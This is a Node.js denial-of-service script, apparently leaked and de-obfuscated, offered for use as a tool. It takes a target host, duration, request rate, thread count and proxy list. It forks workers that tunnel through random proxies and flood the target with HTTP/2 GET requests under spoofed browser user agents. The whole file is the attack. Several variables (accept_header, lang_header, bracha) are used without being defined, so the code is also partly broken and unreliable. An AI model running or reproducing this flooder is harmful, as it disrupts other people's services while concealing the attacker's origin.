const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (polley) {});
if (process.argv.length < 8) {
  console.log("node anus.js host time rps threads proxy.txt anus | deobf by t.me/leaksify");
  process.exit();
}
const headers = {};
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/604.2", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0"];
const args = {target: process.argv[2], time: parseInt(process.argv[3]), Rate: parseInt(process.argv[4]), threads: parseInt(process.argv[5]), proxyFile: parseInt(process.argv[6]), anus: process.argv[7]};
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x50c6b5, _0x1f50d4) {
    const bub = "CONNECT " + _0x50c6b5.address + ":443 HTTP/1.1\r\nHost: " + _0x50c6b5.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const artrina = Buffer.from(bub);
    const evren = net.connect({host: _0x50c6b5.host, port: _0x50c6b5.port});
    evren.setTimeout(_0x50c6b5.timeout * 1e4);
    evren.setKeepAlive(true, 6e4);
    evren.on("connect", () => {
      evren.write(artrina);
    });
    evren.on("data", sheriah => {
      const zygmond = sheriah.toString("utf-8");
      const pilot = zygmond.includes("HTTP/1.1 200");
      if (pilot === false) {
        evren.destroy();
        return _0x1f50d4(undefined, "error: invalid response from proxy server");
      }
      return _0x1f50d4(evren, undefined);
    });
    evren.on("timeout", () => {
      evren.destroy();
      return _0x1f50d4(undefined, "error: timeout exceeded");
    });
    evren.on("error", alpharetta => {
      evren.destroy();
      return _0x1f50d4(undefined, "error: " + alpharetta);
    });
  }
}
const Header = new NetSocket;
headers[":method"] = "GET";
headers.GET = " / HTTP/2";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.Referer = "https://google.com";
headers.accept = accept_header[Math.floor(Math.random() * (accept_header.length - 0) + 0)];
headers["accept-language"] = lang_header[Math.floor(Math.random() * (lang_header.length - 0) + 0)];
headers["accept-encoding"] = "gzip, deflate, br";
headers.Connection = "keep-alive";
headers["upgrade-insecure-requests"] = "1";
headers.TE = "trailers";
headers["x-requested-with"] = "XMLHttpRequest";
headers.pragma = "no-cache";
headers.Cookie = "";
function runFlooder() {
  const zamil = proxies[Math.floor(Math.random() * (proxies.length - 0) + 0)];
  const attiya = zamil.split(":");
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = userAgents[Math.floor(Math.random() * (userAgents.length - 0) + 0)];
  const saudi = {host: attiya[0], port: parseInt(attiya[1]), address: parsedTarget.host + ":443", timeout: 100};
  Header.HTTP(saudi, (calin, kaletha) => {
    if (kaletha) {
      return;
    }
    calin.setKeepAlive(true, 6e4);
    const mry = {ALPNProtocols: ["h2"], followAllRedirects: true, challengeToSolve: 5, clientTimeout: 5e3, clientlareMaxTimeout: 15e3, echdCurve: "GREASE:X25519:x25519", ciphers: "TLS_AES_128_GCM_SHA256", rejectUnauthorized: false, socket: calin, decodeEmails: false, honorCipherOrder: true, requestCert: true, secure: true, port: 443, uri: parsedTarget.host, servername: parsedTarget.host};
    const generosa = tls.connect(443, parsedTarget.host, mry);
    generosa.setKeepAlive(true, 6e5);
    const hestia = http2.connect("https://" + parsedTarget.host, {protocol: "https:", settings: {headerTableSize: 65536, maxConcurrentStreams: 1e3, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false}, maxSessionMemory: 64e3, maxDeflateDynamicTableSize: 4294967295, createConnection: () => generosa, socket: calin});
    hestia.settings({headerTableSize: 65536, maxConcurrentStreams: 2e4, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false});
    hestia.on("connect", () => {
      const aryana = setInterval(() => {
        for (let shaquandria = 0; shaquandria < args.Rate; shaquandria++) {
          const oram = hestia.request(headers).on("response", maysha => {
            oram.close();
            oram.destroy();
            const eygpt = hestia.request(headers).on("response", rava => {
              eygpt.close();
              eygpt.destroy();
            });
            eygpt.end();
          });
          oram.end();
        }
      }, 1e3);
      setTimeout(() => {
        clearInterval(aryana);
        hestia.destroy();
        calin.destroy();
        runFlooder();
      }, args.time * 1e3);
    });
    hestia.on("close", () => {
      clearInterval(bracha);
      hestia.destroy();
      calin.destroy();
      runFlooder();
    });
    hestia.on("error", brackston => {
      clearInterval(bracha);
      hestia.destroy();
      calin.destroy();
      runFlooder();
    });
  });
}
runFlooder();
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1e3);
